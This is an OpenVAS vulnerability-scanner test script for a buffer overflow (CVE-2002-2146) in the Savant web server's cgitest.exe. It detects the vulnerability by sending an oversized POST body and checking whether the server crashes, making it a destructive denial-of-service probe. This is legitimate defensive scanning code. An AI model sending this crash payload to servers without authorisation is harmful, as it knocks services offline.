###############################################################################
# OpenVAS Vulnerability Test
#
# Savant cgitest.exe buffer overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11173");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-2146");
  script_bugtraq_id(5706);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Savant cgitest.exe buffer overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server or remove this CGI.");

  script_tag(name:"summary", value:"cgitest.exe from Savant web server is installed. This CGI is
  vulnerable to a buffer overflow which may allow an attacker to crash the server or even run
  code on it.");

  script_tag(name:"affected", value:"Savant version 3.1. Other versions might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

if( http_is_dead( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/cgitest.exe";

  if( is_cgi_installed_ka( item:url, port:port ) ) {

    soc = http_open_socket( port );
    if( ! soc ) exit( 0 );

    len = 256; # 136 should be enough
    req = string( "POST ", url, " HTTP/1.0\r\n",
                  "Host: ", get_host_ip(),
                  "\r\nContent-Length: ", len,
                  "\r\n\r\n", crap( len ), "\r\n" );
    send( socket:soc, data:req );
    http_close_socket( soc );

    sleep( 1 );

    if( http_is_dead( port:port ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );